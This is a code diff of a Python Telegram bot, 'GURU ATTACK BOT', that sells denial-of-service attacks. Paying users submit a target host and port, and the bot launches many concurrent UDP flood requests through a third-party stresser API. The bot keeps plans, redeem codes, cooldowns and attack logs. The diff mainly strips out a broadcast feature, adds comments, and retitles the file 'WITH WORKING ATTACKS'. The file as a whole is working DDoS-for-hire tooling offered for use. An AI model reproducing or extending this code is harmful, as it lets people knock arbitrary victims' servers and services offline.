@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH BROADCAST FEATURE
+# app.py - COMPLETE FIXED VERSION WITH WORKING ATTACKS
 import os
 import logging
 import asyncio
@@ -9,7 +9,7 @@ import random
 import string
 from datetime import datetime, timedelta
 from flask import Flask, jsonify
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto, InputMediaVideo
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, 
     CommandHandler, 
@@ -26,7 +26,7 @@ load_dotenv()
 # ===== CONFIGURATION =====
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
-API_URL = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
+API_URL = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")  # Make this configurable
 MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
@@ -67,11 +67,9 @@ class Database:
                 self.codes = self.db.redeem_codes
                 self.logs = self.db.attack_logs
                 self.admins = self.db.admins
-                self.broadcasts = self.db.broadcasts
                 
                 self.users.create_index("user_id", unique=True)
                 self.codes.create_index("code", unique=True)
-                self.broadcasts.create_index("created_at", -1)
                 
                 logger.info("✅ MongoDB connected")
             else:
@@ -83,7 +81,6 @@ class Database:
             self.codes = {}
             self.logs = []
             self.admins = {}
-            self.broadcasts = []
     
     def add_user(self, user_id, username=None, first_name=None):
         if not self.memory_mode:
@@ -128,6 +125,7 @@ class Database:
         return self.users.get(user_id)
     
     def get_user_plan(self, user_id):
+        """Get user's plan and expiry - FIXED with debug logging"""
         user = self.get_user(user_id)
         if not user:
             logger.warning(f"User {user_id} not found in database")
@@ -138,14 +136,18 @@ class Database:
         
         logger.info(f"DEBUG: User {user_id} - Raw data: plan={plan}, expiry={expiry}")
         
+        # If plan is free, return free
         if plan == "free":
             return "free", None
         
+        # If plan is premium, check expiry
         if plan == "premium":
+            # If no expiry, it's lifetime
             if expiry is None:
                 logger.info(f"DEBUG: User {user_id} has LIFETIME premium")
                 return "premium", None
             
+            # Handle string expiry
             if isinstance(expiry, str):
                 try:
                     expiry = datetime.fromisoformat(expiry)
@@ -154,6 +156,7 @@ class Database:
                     logger.error(f"DEBUG: Error parsing expiry for {user_id}: {e}")
                     return "premium", None
             
+            # Check if expired
             if expiry and isinstance(expiry, datetime):
                 if expiry < datetime.now():
                     logger.info(f"DEBUG: User {user_id} plan expired at {expiry}")
@@ -168,6 +171,7 @@ class Database:
         return plan, expiry
     
     def update_user_plan(self, user_id, plan, expiry):
+        """Update user plan"""
         if not self.memory_mode:
             expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
             result = self.users.update_one(
@@ -475,34 +479,6 @@ class Database:
                     count += 1
             return count
     
-    def log_broadcast(self, broadcast_id, sent_by, total_users, successful, failed, media_type=None):
-        if not self.memory_mode:
-            self.broadcasts.insert_one({
-                "broadcast_id": broadcast_id,
-                "sent_by": sent_by,
-                "total_users": total_users,
-                "successful": successful,
-                "failed": failed,
-                "media_type": media_type,
-                "created_at": datetime.now()
-            })
-        else:
-            self.broadcasts.append({
-                "broadcast_id": broadcast_id,
-                "sent_by": sent_by,
-                "total_users": total_users,
-                "successful": successful,
-                "failed": failed,
-                "media_type": media_type,
-                "created_at": datetime.now()
-            })
-    
-    def get_broadcast_stats(self):
-        if not self.memory_mode:
-            return list(self.broadcasts.find({}).sort("created_at", -1).limit(10))
-        else:
-            return self.broadcasts[-10:]
-    
     def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=20):
         log = {
             "user_id": user_id,
@@ -749,8 +725,9 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK =====
+# ===== API ATTACK - FIXED =====
 async def send_api_attack(target, port, duration, attack_num, api_key, api_url):
+    """Send single API attack request"""
     params = {
         "key": api_key,
         "host": target,
@@ -800,8 +777,9 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url):
             "error": str(e)[:50]
         }
 
-# ===== CONCURRENT ATTACKS =====
+# ===== CONCURRENT ATTACKS - FIXED =====
 async def send_concurrent_attacks(target, port, duration, user_id, context):
+    """Send multiple concurrent attacks"""
     logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent UDP attacks on {target}:{port}")
     
     api_key = os.getenv("API_KEY")
@@ -826,19 +804,23 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
         parse_mode='Markdown'
     )
     
+    # Create all tasks
     tasks = []
     for i in range(1, MAX_CONCURRENT + 1):
         task = send_api_attack(target, port, duration, i, api_key, api_url)
         tasks.append(task)
     
+    # Start timer update task
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
     
+    # Run all tasks concurrently
     start_time = time.time()
     results = await asyncio.gather(*tasks, return_exceptions=True)
     elapsed = time.time() - start_time
     
     timer_task.cancel()
     
+    # Process results
     success_count = 0
     failed_count = 0
     result_details = []
@@ -856,6 +838,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
                 error = r.get('error', r.get('response', 'Unknown error'))
                 result_details.append(f"❌ Attack {r.get('attack_num', '?')} - {error[:30]}")
     
+    # Create final message
     cooldown = attack_manager.get_cooldown_time(duration)
     
     final_text = (
@@ -888,6 +871,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
     }
 
 async def update_timer(status_msg, duration, target, port):
+    """Update the attack timer in the message"""
     try:
         start_time = time.time()
         last_update = 0
@@ -922,8 +906,9 @@ async def update_timer(status_msg, duration, target, port):
     except Exception as e:
         logger.error(f"Timer update error: {e}")
 
-# ===== CHECK API STATUS =====
+# ===== CHECK API STATUS - FIXED =====
 async def check_api_status():
+    """Check if the API is working"""
     try:
         api_url = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
         api_key = os.getenv("API_KEY")
@@ -956,226 +941,6 @@ async def check_api_status():
         return False, "❌ Connection timeout - API is not responding"
     except Exception as e:
         return False, f"❌ Connection Failed: {str(e)[:50]}"
-
-# ===== BROADCAST FUNCTIONS =====
-async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start broadcast process"""
-    user_id = update.effective_user.id
-    
-    if not db.is_admin(user_id):
-        await update.message.reply_text("❌ You don't have permission to use this command!")
-        return
-    
-    await update.message.reply_text(
-        "📢 *BROADCAST*\n\n"
-        "Send me the message you want to broadcast to all users.\n"
-        "You can send:\n"
-        "• Text message\n"
-        "• Photo (with caption)\n"
-        "• Video (with caption)\n\n"
-        "⚠️ *Warning:* This will send to ALL bot users!\n"
-        "Send /cancel to cancel.",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_broadcast'] = True
-
-async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process broadcast message"""
-    if not context.user_data.get('awaiting_broadcast'):
-        return
-    
-    if update.message.text and update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_broadcast'] = False
-        await update.message.reply_text("✅ Broadcast cancelled.")
-        return
-    
-    user_id = update.effective_user.id
-    
-    if not db.is_admin(user_id):
-        await update.message.reply_text("❌ You don't have permission!")
-        context.user_data['awaiting_broadcast'] = False
-        return
-    
-    # Get all users
-    users = db.get_all_users()
-    total_users = len(users)
-    
-    if total_users == 0:
-        await update.message.reply_text("❌ No users to broadcast to!")
-        context.user_data['awaiting_broadcast'] = False
-        return
-    
-    # Create a progress message
-    progress_msg = await update.message.reply_text(
-        f"📢 *Broadcasting...*\n\n"
-        f"👥 Total users: {total_users}\n"
-        f"⏳ Progress: 0/{total_users}\n"
-        f"✅ Success: 0\n"
-        f"❌ Failed: 0\n"
-        f"⏱️ Estimated time: Calculating...",
-        parse_mode='Markdown'
-    )
-    
-    # Get message content
-    message_text = None
-    photo_file_id = None
-    video_file_id = None
-    caption = None
-    
-    if update.message.text:
-        message_text = update.message.text
-        media_type = "text"
-    elif update.message.photo:
-        photo_file_id = update.message.photo[-1].file_id
-        caption = update.message.caption
-        media_type = "photo"
-    elif update.message.video:
-        video_file_id = update.message.video.file_id
-        caption = update.message.caption
-        media_type = "video"
-    else:
-        await update.message.reply_text("❌ Unsupported media type! Please send text, photo, or video.")
-        context.user_data['awaiting_broadcast'] = False
-        return
-    
-    # Start broadcasting
-    successful = 0
-    failed = 0
-    failed_users = []
-    start_time = time.time()
-    
-    for i, user in enumerate(users):
-        user_id2 = user['user_id']
-        
-        # Skip banned users
-        if db.is_banned(user_id2):
-            continue
-        
-        try:
-            if message_text:
-                await context.bot.send_message(
-                    chat_id=user_id2,
-                    text=message_text,
-                    parse_mode='Markdown'
-                )
-            elif photo_file_id:
-                await context.bot.send_photo(
-                    chat_id=user_id2,
-                    photo=photo_file_id,
-                    caption=caption,
-                    parse_mode='Markdown'
-                )
-            elif video_file_id:
-                await context.bot.send_video(
-                    chat_id=user_id2,
-                    video=video_file_id,
-                    caption=caption,
-                    parse_mode='Markdown'
-                )
-            successful += 1
-        except Exception as e:
-            failed += 1
-            failed_users.append(f"{user_id2}: {str(e)[:30]}")
-            logger.error(f"Failed to send broadcast to {user_id2}: {e}")
-        
-        # Update progress every 10 users
-        if (i + 1) % 10 == 0 or (i + 1) == total_users:
-            elapsed = time.time() - start_time
-            estimated_total = (elapsed / (i + 1)) * total_users if i > 0 else 0
-            remaining = max(0, estimated_total - elapsed)
-            
-            try:
-                await progress_msg.edit_text(
-                    f"📢 *Broadcasting...*\n\n"
-                    f"👥 Total users: {total_users}\n"
-                    f"⏳ Progress: {i + 1}/{total_users}\n"
-                    f"✅ Success: {successful}\n"
-                    f"❌ Failed: {failed}\n"
-                    f"⏱️ Elapsed: {int(elapsed)}s\n"
-                    f"⏳ Remaining: {int(remaining)}s",
-                    parse_mode='Markdown'
-                )
-            except:
-                pass
-        
-        # Small delay to avoid rate limiting
-        await asyncio.sleep(0.05)
-    
-    # Log broadcast
-    broadcast_id = f"broadcast_{int(time.time())}"
-    db.log_broadcast(broadcast_id, user_id, total_users, successful, failed, media_type)
-    
-    # Final result
-    result_text = (
-        f"✅ *Broadcast Complete!*\n\n"
-        f"👥 Total users: {total_users}\n"
-        f"✅ Successful: {successful}\n"
-        f"❌ Failed: {failed}\n"
-        f"⏱️ Time taken: {int(time.time() - start_time)}s\n"
-        f"📊 Success rate: {int((successful / total_users) * 100) if total_users > 0 else 0}%\n"
-        f"📝 Broadcast ID: `{broadcast_id}`"
-    )
-    
-    if failed_users:
-        result_text += f"\n\n❌ *Failed users:*\n" + "\n".join(failed_users[:5])
-        if len(failed_users) > 5:
-            result_text += f"\n... and {len(failed_users) - 5} more"
-    
-    await progress_msg.edit_text(result_text, parse_mode='Markdown')
-    
-    # Send confirmation to all admins
-    admins = db.get_admins()
-    for admin in admins:
-        try:
-            if admin['user_id'] != user_id:
-                await context.bot.send_message(
-                    chat_id=admin['user_id'],
-                    text=f"📢 *Broadcast Completed*\n\n"
-                         f"By: `{user_id}`\n"
-                         f"Successful: {successful}\n"
-                         f"Failed: {failed}\n"
-                         f"ID: `{broadcast_id}`",
-                    parse_mode='Markdown'
-                )
-        except:
-            pass
-    
-    context.user_data['awaiting_broadcast'] = False
-
-async def broadcast_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """View broadcast statistics"""
-    user_id = update.effective_user.id
-    
-    if not db.is_admin(user_id):
-        await update.message.reply_text("❌ You don't have permission!")
-        return
-    
-    broadcasts = db.get_broadcast_stats()
-    
-    if not broadcasts:
-        await update.message.reply_text("📊 No broadcasts sent yet.")
-        return
-    
-    text = "📊 *Broadcast History*\n\n"
-    for b in broadcasts[:10]:
-        created_at = b.get('created_at', datetime.now())
-        if isinstance(created_at, datetime):
-            created_at_str = created_at.strftime('%Y-%m-%d %H:%M')
-        else:
-            created_at_str = str(created_at)
-        
-        media_type = b.get('media_type', 'text').upper()
-        total = b.get('total_users', 0)
-        successful = b.get('successful', 0)
-        failed = b.get('failed', 0)
-        success_rate = int((successful / total) * 100) if total > 0 else 0
-        
-        text += f"📅 {created_at_str}\n"
-        text += f"📎 Type: {media_type}\n"
-        text += f"👥 {successful}/{total} ({success_rate}%)\n"
-        text += f"❌ Failed: {failed}\n\n"
-    
-    await update.message.reply_text(text, parse_mode='Markdown')
 
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1578,8 +1343,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
         [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
         [InlineKeyboardButton("🗑️ DELETE USED CODES", callback_data="admin_delete_used")],
-        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
-        [InlineKeyboardButton("📊 BROADCAST HISTORY", callback_data="admin_broadcast_stats")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
@@ -1588,73 +1351,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚙️ *ADMIN PANEL*\n\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
-    )
-
-async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Broadcast button handler"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_admin(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    await query.edit_message_text(
-        "📢 *BROADCAST*\n\n"
-        "Send me the message you want to broadcast to all users.\n"
-        "You can send:\n"
-        "• Text message\n"
-        "• Photo (with caption)\n"
-        "• Video (with caption)\n\n"
-        "⚠️ *Warning:* This will send to ALL bot users!\n"
-        "Send /cancel to cancel.",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_broadcast'] = True
-
-async def admin_broadcast_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Broadcast stats button handler"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_admin(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    broadcasts = db.get_broadcast_stats()
-    
-    if not broadcasts:
-        await query.edit_message_text(
-            "📊 No broadcasts sent yet.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-        )
-        return
-    
-    text = "📊 *Broadcast History*\n\n"
-    for b in broadcasts[:10]:
-        created_at = b.get('created_at', datetime.now())
-        if isinstance(created_at, datetime):
-            created_at_str = created_at.strftime('%Y-%m-%d %H:%M')
-        else:
-            created_at_str = str(created_at)
-        
-        media_type = b.get('media_type', 'text').upper()
-        total = b.get('total_users', 0)
-        successful = b.get('successful', 0)
-        failed = b.get('failed', 0)
-        success_rate = int((successful / total) * 100) if total > 0 else 0
-        
-        text += f"📅 {created_at_str}\n"
-        text += f"📎 Type: {media_type}\n"
-        text += f"👥 {successful}/{total} ({success_rate}%)\n"
-        text += f"❌ Failed: {failed}\n\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
 async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1903,8 +1599,6 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
         [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
         [InlineKeyboardButton("🚫 BANNED USERS", callback_data="owner_banned_users")],
-        [InlineKeyboardButton("📢 BROADCAST", callback_data="owner_broadcast")],
-        [InlineKeyboardButton("📊 BROADCAST HISTORY", callback_data="owner_broadcast_stats")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
@@ -1913,73 +1607,6 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(
         "👑 OWNER PANEL\n\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-async def owner_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner broadcast button handler"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_owner_or_pseudo(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    await query.edit_message_text(
-        "📢 *BROADCAST*\n\n"
-        "Send me the message you want to broadcast to all users.\n"
-        "You can send:\n"
-        "• Text message\n"
-        "• Photo (with caption)\n"
-        "• Video (with caption)\n\n"
-        "⚠️ *Warning:* This will send to ALL bot users!\n"
-        "Send /cancel to cancel.",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_broadcast'] = True
-
-async def owner_broadcast_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner broadcast stats button handler"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_owner_or_pseudo(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    broadcasts = db.get_broadcast_stats()
-    
-    if not broadcasts:
-        await query.edit_message_text(
-            "📊 No broadcasts sent yet.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-        )
-        return
-    
-    text = "📊 *Broadcast History*\n\n"
-    for b in broadcasts[:10]:
-        created_at = b.get('created_at', datetime.now())
-        if isinstance(created_at, datetime):
-            created_at_str = created_at.strftime('%Y-%m-%d %H:%M')
-        else:
-            created_at_str = str(created_at)
-        
-        media_type = b.get('media_type', 'text').upper()
-        total = b.get('total_users', 0)
-        successful = b.get('successful', 0)
-        failed = b.get('failed', 0)
-        success_rate = int((successful / total) * 100) if total > 0 else 0
-        
-        text += f"📅 {created_at_str}\n"
-        text += f"📎 Type: {media_type}\n"
-        text += f"👥 {successful}/{total} ({success_rate}%)\n"
-        text += f"❌ Failed: {failed}\n\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
 # ===== API STATUS =====
@@ -2510,8 +2137,6 @@ async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_ban(update, context)
     elif context.user_data.get('awaiting_unban'):
         await process_unban(update, context)
-    elif context.user_data.get('awaiting_broadcast'):
-        await process_broadcast(update, context)
 
 # ===== RUN BOT =====
 application = None
@@ -2529,8 +2154,6 @@ def run_bot():
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
     app.add_handler(CommandHandler("status", status_command))
-    app.add_handler(CommandHandler("broadcast", broadcast_command))
-    app.add_handler(CommandHandler("broadcaststats", broadcast_stats))
     app.add_handler(CommandHandler("cancel", cancel))
     
     # ===== CALLBACK QUERY HANDLERS =====
@@ -2547,8 +2170,6 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
     app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
     app.add_handler(CallbackQueryHandler(admin_delete_used_callback, pattern="^admin_delete_used$"))
-    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
-    app.add_handler(CallbackQueryHandler(admin_broadcast_stats_callback, pattern="^admin_broadcast_stats$"))
     
     # Delete handlers
     app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
@@ -2566,14 +2187,10 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
     app.add_handler(CallbackQueryHandler(owner_banned_users, pattern="^owner_banned_users$"))
     app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
-    app.add_handler(CallbackQueryHandler(owner_broadcast_callback, pattern="^owner_broadcast$"))
-    app.add_handler(CallbackQueryHandler(owner_broadcast_stats_callback, pattern="^owner_broadcast_stats$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
     # ===== MESSAGE ROUTER =====
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
-    app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, message_router))
-    app.add_handler(MessageHandler(filters.VIDEO & ~filters.COMMAND, message_router))
     
     loop.run_until_complete(app.initialize())
     loop.run_until_complete(app.start())
@@ -2584,7 +2201,7 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("👑 GURU ATTACK BOT - FIXED VERSION WITH BROADCAST")
+    print("👑 GURU ATTACK BOT - FIXED VERSION")
     print(f"⚡ {MAX_CONCURRENT}x UDP CONCURRENT")
     print("📌 API-ONLY - NO FALLBACK")
     print("📌 Global Cooldown - One attack at a time")
@@ -2593,7 +2210,6 @@ if __name__ == "__main__":
     print("📌 Owner & Pseudo_Owner have equal powers")
     print("📌 Live Time Updates in Bot DM")
     print("📌 Real-time Alerts to Admins")
-    print("📌 Broadcast: Text, Photos, Videos")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
